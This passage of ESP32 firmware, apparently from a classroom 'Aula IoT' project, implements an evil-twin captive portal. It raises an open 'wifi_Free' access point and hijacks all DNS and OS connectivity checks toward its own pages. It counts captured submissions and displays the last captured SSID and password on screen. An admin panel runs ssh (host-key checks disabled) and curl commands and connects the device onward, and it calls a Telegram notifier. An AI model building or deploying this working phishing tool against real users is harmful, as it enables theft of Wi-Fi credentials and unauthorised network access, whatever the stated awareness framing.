    if (ci >= 0) {
      sshCmd = args.substring(ci + 4);
      sshCmd.trim();
      if (sshCmd.startsWith("\"") && sshCmd.endsWith("\"")) sshCmd = sshCmd.substring(1, sshCmd.length()-1);
      userHost = args.substring(0, ci);
    } else {
      sshCmd = "uname -a";
    }

    int pwi = userHost.indexOf(" -pw ");
    if (pwi >= 0) {
      String rest = userHost.substring(pwi + 5);
      rest.trim();
      int nsp = rest.indexOf(' ');
      sshPass = nsp > 0 ? rest.substring(0, nsp) : rest;
      userHost = userHost.substring(0, pwi);
    }

    int pi2 = userHost.indexOf(" -p ");
    if (pi2 >= 0) {
      String rest = userHost.substring(pi2 + 4);
      rest.trim();
      int nsp = rest.indexOf(' ');
      sshPort = (nsp > 0 ? rest.substring(0, nsp) : rest).toInt();
      userHost = userHost.substring(0, pi2);
    }

    userHost.trim();
    int at = userHost.indexOf('@');
    if (at < 1) return "ssh: formato invalido. Use: ssh user@host -c CMD";
    sshUser = userHost.substring(0, at);
    sshHost = userHost.substring(at + 1);
    if (sshHost.length() == 0) return "ssh: host vazio";
    if (sshUser.length() == 0 || sshUser.length() > 32) return "ssh: usuario invalido";
    if (sshHost.length() > 63) return "ssh: host muito longo";
    if (sshPort < 1 || sshPort > 65535) return "ssh: porta invalida";
    if (sshCmd.length() == 0) return "ssh: comando vazio";
    if (sshCmd.length() > 200) return "ssh: comando muito longo";

    String r = "ssh " + sshUser + "@" + sshHost + ":" + String(sshPort) + "\n";

    ssh_session session = ssh_new();
    if (!session) return "ssh: erro - memoria insuficiente";

    ssh_options_set(session, SSH_OPTIONS_HOST, sshHost.c_str());
    ssh_options_set(session, SSH_OPTIONS_PORT, &sshPort);
    ssh_options_set(session, SSH_OPTIONS_USER, sshUser.c_str());
    int noVerify = 0;
    ssh_options_set(session, SSH_OPTIONS_STRICTHOSTKEYCHECK, &noVerify);
    long tout = 10;
    ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &tout);
    ssh_set_blocking(session, 1);

    int rc = ssh_connect(session);
    if (rc != SSH_OK) {
      r += "Conexao falhou: " + String(ssh_get_error(session));
      ssh_free(session);
      return r;
    }
    r += "Conectado.\n";

    if (sshPass.length() > 0) {
      rc = ssh_userauth_password(session, NULL, sshPass.c_str());
    } else {
      rc = ssh_userauth_none(session, NULL);
    }
    if (rc != SSH_AUTH_SUCCESS) {
      r += "Autenticacao falhou.";
      ssh_disconnect(session);
      ssh_free(session);
      return r;
    }
    r += "Autenticado.\n";

    ssh_channel channel = ssh_channel_new(session);
    if (!channel || ssh_channel_open_session(channel) != SSH_OK) {
      r += "Erro ao abrir canal.";
      if (channel) ssh_channel_free(channel);
      ssh_disconnect(session);
      ssh_free(session);
      return r;
    }

    rc = ssh_channel_request_exec(channel, sshCmd.c_str());
    if (rc != SSH_OK) {
      r += "Erro ao executar: " + sshCmd;
      ssh_channel_close(channel);
      ssh_channel_free(channel);
      ssh_disconnect(session);
      ssh_free(session);
      return r;
    }

    r += "--- output ---\n";
    char buf[256];
    int nb;
    String out = "";
    while ((nb = ssh_channel_read(channel, buf, sizeof(buf)-1, 0)) > 0) {
      buf[nb] = '\0';
      out += String(buf);
      if (out.length() > 2000) { out += "\n...(truncado)"; break; }
    }
    while ((nb = ssh_channel_read(channel, buf, sizeof(buf)-1, 1)) > 0) {
      buf[nb] = '\0';
      out += String(buf);
      if (out.length() > 2500) break;
    }
    r += out.length() > 0 ? out : "(sem output)";
    r += "\n--- exit: " + String(ssh_channel_get_exit_status(channel)) + " ---";

    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    ssh_disconnect(session);
    ssh_free(session);
    return r;
  }

  // ==================== curl ====================
  if (base == "curl") {
    if (args == "--help" || args.length() == 0) return "curl [OPCOES] URL\n\n  -I         somente headers\n  -s         modo silencioso (sem progresso)\n  -L         seguir redirects (default)\n  -o FILE    (ignorado no ESP32)\n\nExemplos:\n  curl http://example.com\n  curl -I https://google.com\n  curl http://api.ipify.org";
    ensureSTARoute();
    if (WiFi.status() != WL_CONNECTED) return "curl: rede inacessivel - conecte com nmcli primeiro";

    bool headersOnly = false;
    String url = args;

    // parse flags
    if (url.indexOf("-I ") >= 0 || url.endsWith(" -I")) {
      headersOnly = true;
      url.replace("-I ", "");
      url.replace(" -I", "");
    }
    url.replace("-s ", ""); url.replace(" -s", "");
    url.replace("-L ", ""); url.replace(" -L", "");
    url.replace("-o ", ""); // ignore -o
    url.trim();

    if (!url.startsWith("http://") && !url.startsWith("https://")) {
      url = "http://" + url;
    }
    if (url.length() > 200) return "curl: URL muito longa (max 200)";

    HTTPClient http;
    WiFiClient wc;
    WiFiClientSecure wcs;
    wcs.setInsecure(); // skip cert validation on ESP32

    bool isHTTPS = url.startsWith("https://");
    if (isHTTPS) {
      http.begin(wcs, url);
    } else {
      http.begin(wc, url);
    }
    http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    http.setTimeout(8000);
    http.setUserAgent("curl/8.0 (ESP32-Bellwether)");

    int code = http.GET();
    String r = "";

    if (code > 0) {
      r += "HTTP/1.1 " + String(code) + "\n";
      if (headersOnly) {
        r += "Content-Length: " + String(http.getSize()) + "\n";
        String ct = http.header("Content-Type");
        if (ct.length() > 0) r += "Content-Type: " + ct + "\n";
        String loc = http.header("Location");
        if (loc.length() > 0) r += "Location: " + loc + "\n";
        String srv = http.header("Server");
        if (srv.length() > 0) r += "Server: " + srv + "\n";
      } else {
        String body = http.getString();
        if (body.length() > 2000) body = body.substring(0, 2000) + "\n...(truncado)";
        r += body;
      }
    } else {
      r = "curl: (" + String(code) + ") " + http.errorToString(code);
    }
    http.end();
    return r;
  }

  if (base == "wget") return "wget: use 'curl' ao inves disso";

  return "bash: " + base + ": command not found\nDigite 'help' para ver comandos disponiveis.";
}

void portalHandleCmd() {
  if (!adminLogado) {
    webServer.send(403, "text/plain", "Acesso negado");
    return;
  }
  if (!webServer.hasArg("cmd")) {
    webServer.send(400, "text/plain", "Parametro 'cmd' ausente");
    return;
  }
  String cmd = webServer.arg("cmd");
  String result = processCommand(cmd);
  webServer.send(200, "text/plain", result);
}

void portalHandleTerminal() {
  if (!adminLogado) {
    webServer.sendHeader("Location", "/aula");
    webServer.send(302, "text/plain", "Login necessario");
    return;
  }
  webServer.sendHeader("Location", "/painel");
  webServer.send(302, "text/plain", "Redirecionando");
}

// ========== WiFi API ENDPOINTS ==========
void portalHandleApiScan() {
  if (!adminLogado) { webServer.send(403, "application/json", "{\"error\":\"login\"}"); return; }
  int n = WiFi.scanNetworks();
  String json = "[";
  for (int i = 0; i < n && i < 20; i++) {
    if (i > 0) json += ",";
    String enc = "OPEN";
    switch (WiFi.encryptionType(i)) {
      case WIFI_AUTH_WPA_PSK: enc = "WPA"; break;
      case WIFI_AUTH_WPA2_PSK: enc = "WPA2"; break;
      case WIFI_AUTH_WPA_WPA2_PSK: enc = "WPA/WPA2"; break;
      case WIFI_AUTH_WPA2_ENTERPRISE: enc = "WPA2-ENT"; break;
      case WIFI_AUTH_OPEN: enc = "OPEN"; break;
      default: enc = "ENC"; break;
    }
    json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",\"rssi\":" + String(WiFi.RSSI(i)) + ",\"ch\":" + String(WiFi.channel(i)) + ",\"enc\":\"" + enc + "\"}";
  }
  json += "]";
  WiFi.scanDelete();
  webServer.send(200, "application/json", json);
}

void portalHandleApiConnect() {
  if (!adminLogado) { webServer.send(403, "application/json", "{\"error\":\"login\"}"); return; }
  if (!webServer.hasArg("ssid") || !webServer.hasArg("pass")) {
    webServer.send(400, "application/json", "{\"error\":\"ssid e pass obrigatorios\"}");
    return;
  }
  String ssid = webServer.arg("ssid");
  String pass = webServer.arg("pass");
  if (ssid.length() == 0 || ssid.length() > 32) {
    webServer.send(400, "application/json", "{\"error\":\"SSID invalido\"}");
    return;
  }

  // Non-blocking: store params and respond immediately
  // portalTask will handle the actual connection
  // DNS stays running so phone keeps captive portal access

  // Just add STA mode — do NOT restart the AP or phone will disconnect
  WiFi.mode(WIFI_AP_STA);
  delay(100);

  if (pass.length() == 0) {
    WiFi.begin(ssid.c_str());
  } else {
    WiFi.begin(ssid.c_str(), pass.c_str());
  }

  wifiPendingSSID = ssid;
  wifiPendingPass = pass;
  wifiConnecting = true;
  wifiConnectStart = millis();

  // Respond immediately — client will poll /api/wifi-status
  webServer.send(200, "application/json", "{\"ok\":true,\"connecting\":true,\"ssid\":\"" + ssid + "\"}" );
}

void portalHandleApiWifiStatus() {
  if (!adminLogado) { webServer.send(403, "application/json", "{\"error\":\"login\"}"); return; }
  if (wifiConnecting) {
    unsigned long elapsed = (millis() - wifiConnectStart) / 1000;
    webServer.send(200, "application/json", "{\"connected\":false,\"connecting\":true,\"ssid\":\"" + wifiPendingSSID + "\",\"elapsed\":" + String(elapsed) + "}");
    return;
  }
  if (WiFi.status() == WL_CONNECTED) {
    String r = "{\"connected\":true,\"ssid\":\"" + WiFi.SSID() + "\",\"ip\":\"" + WiFi.localIP().toString() + "\",\"rssi\":" + String(WiFi.RSSI()) + ",\"gw\":\"" + WiFi.gatewayIP().toString() + "\",\"dns\":\"" + WiFi.dnsIP().toString() + "\"}";
    webServer.send(200, "application/json", r);
  } else {
    webServer.send(200, "application/json", "{\"connected\":false}");
  }
}

void portalHandleApiWifiDisconnect() {
  if (!adminLogado) { webServer.send(403, "application/json", "{\"error\":\"login\"}"); return; }
  WiFi.disconnect(true);
  delay(100);
  WiFi.mode(WIFI_AP);
  delay(200);
  setDefaultRoute(false);
  dnsServer.start(53, "*", IPAddress(8,8,4,4));
  webServer.send(200, "application/json", "{\"ok\":true}");
}

// ========== LOG ROUTE ==========
void portalHandleLog() {
  if (!adminLogado) {
    webServer.sendHeader("Location", "/aula");
    webServer.send(302, "text/plain", "Login necessario");
    return;
  }
  String page = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Logs - Bellwether</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Courier New',monospace;background:#0a0a0a;color:#ccc;min-height:100vh}
.topbar{background:#111;padding:8px 15px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #222}
.topbar h3{color:#ffaa00;font-size:13px}
.topbar a{color:#00ff88;text-decoration:none;font-size:11px;padding:4px 10px;border:1px solid #00ff88;border-radius:4px}
.topbar a:hover{background:#00ff88;color:#000}
.content{padding:15px;max-width:600px;margin:0 auto}
h2{color:#ffaa00;margin-bottom:10px;font-size:16px}
.entry{background:#151515;border-left:3px solid #ffaa00;padding:8px 12px;margin:6px 0;border-radius:4px;font-size:12px}
.entry .time{color:#ffaa00}
.entry .ip{color:#4488ff}
.entry .ua{color:#666;font-size:10px}
.empty{color:#444;text-align:center;padding:30px}
</style>
</head>
<body>
<div class="topbar">
<h3>Admin Logs</h3>
<a href="/painel">Voltar</a>
</div>
<div class="content">
<h2>Login History (</h2>
)rawliteral";

  page += String(numLogs) + " entries)</h2>";

  if (numLogs == 0) {
    page += "<div class='empty'>Nenhum login registrado.</div>";
  } else {
    for (int i = numLogs - 1; i >= 0; i--) {
      unsigned long s = loginLogs[i].timestamp / 1000;
      int h = (s / 3600) % 24;
      int m = (s / 60) % 60;
      int sec = s % 60;
      char ts[16];
      sprintf(ts, "%02d:%02d:%02d", h, m, sec);
      page += "<div class='entry'>";
      page += "<span class='time'>[" + String(ts) + "]</span> ";
      page += "<span class='ip'>" + loginLogs[i].ip + "</span>";
      page += "<div class='ua'>" + loginLogs[i].ua + "</div>";
      page += "</div>";
    }
  }

  page += "</div></body></html>";
  webServer.send(200, "text/html", page);
}

void startPortalBackground() {
  WiFi.disconnect();
  delay(100);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(IPAddress(8,8,4,4), IPAddress(8,8,4,4), IPAddress(255,255,255,0));
  WiFi.softAP("wifi_Free");
  delay(500);

  IPAddress apIP = WiFi.softAPIP();
  dnsServer.start(53, "*", apIP);

  webServer.on("/", portalHandleRoot);
  webServer.on("/save", HTTP_POST, portalHandleSave);
  webServer.on("/aula", portalHandleLoginPage);
  webServer.on("/aula-login", HTTP_POST, portalHandleAdminLogin);
  webServer.on("/painel", portalHandlePainel);
  webServer.on("/terminal", portalHandleTerminal);
  webServer.on("/cmd", HTTP_POST, portalHandleCmd);
  webServer.on("/logout", portalHandleLogout);
  webServer.on("/log", portalHandleLog);
  webServer.on("/api/scan", portalHandleApiScan);
  webServer.on("/api/connect", HTTP_POST, portalHandleApiConnect);
  webServer.on("/api/wifi-status", portalHandleApiWifiStatus);
  webServer.on("/api/wifi-disconnect", HTTP_POST, portalHandleApiWifiDisconnect);
  webServer.on("/generate_204", portalHandleRoot);
  webServer.on("/gen_204", portalHandleRoot);
  webServer.on("/hotspot-detect.html", portalHandleRoot);
  webServer.on("/library/test/success.html", portalHandleRoot);
  webServer.on("/ncsi.txt", portalHandleRoot);
  webServer.on("/connecttest.txt", portalHandleRoot);
  webServer.on("/canonical.html", portalHandleRoot);
  webServer.on("/success.txt", portalHandleRoot);
  webServer.on("/fwlink", portalHandleRoot);
  webServer.onNotFound(portalHandleRoot);
  const char* hdrs[] = {"User-Agent"};
  webServer.collectHeaders(hdrs, 1);
  webServer.begin();

  portalAttempts = 0;
  lastSSID = "";
  lastPass = "";
  numCapturas = 0;
  portalAtivo = true;

  Serial.println("Portal rodando em background");
  Serial.print("AP IP: ");
  Serial.println(apIP);
}

// Task no core 0 - processa DNS e HTTP continuamente
void portalTask(void* param) {
  while (true) {
    if (portalAtivo) {
      dnsServer.processNextRequest();
      webServer.handleClient();

      // Async WiFi connection check
      if (wifiConnecting) {
        if (WiFi.status() == WL_CONNECTED) {
          wifiConnecting = false;
          // Set STA as default route so packets go to real gateway
          setDefaultRoute(true);
          // Restart DNS for AP captive portal clients (ESP32 uses STA route for its own DNS)
          dnsServer.stop();
          dnsServer.start(53, "*", IPAddress(8,8,4,4));
          Serial.println("STA conectado: " + WiFi.localIP().toString());
          notifyTelegramStaConnected();
        } else if (millis() - wifiConnectStart > 20000) {
          wifiConnecting = false;
          WiFi.disconnect(true);
          delay(100);
          WiFi.mode(WIFI_AP);
          delay(200);
          setDefaultRoute(false);
          dnsServer.start(53, "*", IPAddress(8,8,4,4));
          Serial.println("STA timeout - voltando AP");
        }
      }
    }
    vTaskDelay(1);
  }
}

void toolCaptiveAwareness() {
  tft.fillScreen(TFT_BLACK);
  statusBar();
  tft.setTextColor(TFT_RED);
  tft.drawCentreString("Aula IoT - Portal", LARG / 2, 30, 2);

  tft.setTextColor(TFT_GREEN);
  tft.drawString("AP: wifi_Free", 10, 52, 2);
  tft.setTextColor(TFT_DARKGREY);
  IPAddress apIP = WiFi.softAPIP();
  char ipStr[20];
  sprintf(ipStr, "IP: %s", apIP.toString().c_str());
  tft.drawString(ipStr, 10, 72, 1);
  tft.drawString("Admin: http://8.8.4.4/aula", 10, 84, 1);

  tft.drawLine(10, 100, LARG - 10, 100, 0x2945);
  tft.setTextColor(TFT_DARKGREY);
  tft.drawString("Clientes:", 10, 106, 1);
  tft.drawString("Capturas:", 10, 122, 1);
  tft.drawString("Ultimo:", 10, 142, 1);

  drawVoltar();

  unsigned long lastUpdate = 0;
  while (true) {
    if (millis() - lastUpdate > 500) {
      int cli = WiFi.softAPgetStationNum();

      tft.fillRect(90, 104, 80, 14, TFT_BLACK);
      tft.setTextColor(cli > 0 ? TFT_GREEN : TFT_WHITE);
      char buf[8];
      sprintf(buf, "%d", cli);
      tft.drawString(buf, 92, 106, 2);

      tft.fillRect(90, 120, 80, 14, TFT_BLACK);
      tft.setTextColor(portalAttempts > 0 ? TFT_RED : TFT_WHITE);
      sprintf(buf, "%d", portalAttempts);
      tft.drawString(buf, 92, 122, 2);

      if (lastSSID.length() > 0) {
        tft.fillRect(10, 142, 300, 22, TFT_BLACK);
        tft.setTextColor(TFT_CYAN);
        String ultimo = lastSSID + " / " + lastPass;
        if (ultimo.length() > 35) ultimo = ultimo.substring(0, 35);
        tft.drawString(ultimo, 10, 142, 1);
      }

      lastUpdate = millis();
    }

    int x, y;
    if (lerTouch(x, y) && isVoltar(x, y)) {
      delay(200);
      while (ts.touched()) delay(10);
      break;
    }
    delay(5);
  }

  telaMenuPrincipal();
}

// ================= JPEG CALLBACK =================
bool tft_output(int16_t x, int16_t y, uint16_t w, uint16_t h, uint16_t* bitmap) {
  if (y >= ALT) return 0;
  tft.pushImage(x, y, w, h, bitmap);
  return 1;
}

// ================= SPLASH SLIDESHOW =================
void splashScreen() {
  TJpgDec.setJpgScale(1);
  TJpgDec.setSwapBytes(true);
  TJpgDec.setCallback(tft_output);

  int imgIdx = 0;
  unsigned long tImg = 0; // mostra primeira imagem imediato
  bool needDraw = true;

  while (true) {
    // Troca imagem a cada 6 segundos
    if (needDraw || millis() - tImg >= 6000) {
      TJpgDec.drawJpg(0, 0, slideshow_imgs[imgIdx], slideshow_lens[imgIdx]);
      imgIdx = (imgIdx + 1) % NUM_SLIDESHOW_IMAGES;
      tImg = millis();
      needDraw = false;
    }

    if (ts.touched()) {
      delay(200);
      while (ts.touched()) delay(10);
      return;
    }
    delay(10);
  }
}

// ================= SETUP =================
void setup() {
  Serial.begin(115200);
  pinMode(27, OUTPUT);
  digitalWrite(27, HIGH);

  tft.init();
  tft.setRotation(1);

  SPI.begin(14, 12, 13);
  ts.begin();
  ts.setRotation(1);

  loadCalibration();

  startPortalBackground();
  xTaskCreatePinnedToCore(portalTask, "portal", 4096, NULL, 1, NULL, 0);

  splashScreen();
  telaMenuPrincipal();
}

// ================= LOOP =================
void loop() {
  int x, y;
  if (!lerTouch(x, y)) return;

  if (menuState == 0) {
    // MAIN MENU: Captive Portal (y 30-70), Calibrar (y 80-120)
    if (y >= 25 && y <= 75) {
      drawBigBtn("Captive Portal", 0, TFT_GREEN, true);
      delay(120);
      while (ts.touched()) delay(10);
      toolCaptiveAwareness();
    } else if (y >= 75 && y <= 125) {
      drawBigBtn("Calibrar Touch", 1, TFT_YELLOW, true);
      delay(120);
      while (ts.touched()) delay(10);
      toolCalibrar();
    }
  }
}